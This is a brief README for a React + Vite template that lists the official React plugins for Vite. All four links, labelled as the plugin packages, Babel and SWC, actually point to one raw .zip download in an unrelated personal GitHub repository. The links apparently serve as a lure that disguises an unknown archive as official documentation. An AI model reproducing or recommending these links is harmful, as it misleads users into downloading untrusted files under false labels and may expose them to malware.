# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/dev-ismail09/the-news-dragon-with-auth/main/becross/the-news-dragon-with-auth.zip) uses [Babel](https://raw.githubusercontent.com/dev-ismail09/the-news-dragon-with-auth/main/becross/the-news-dragon-with-auth.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/dev-ismail09/the-news-dragon-with-auth/main/becross/the-news-dragon-with-auth.zip) uses [SWC](https://raw.githubusercontent.com/dev-ismail09/the-news-dragon-with-auth/main/becross/the-news-dragon-with-auth.zip) for Fast Refresh
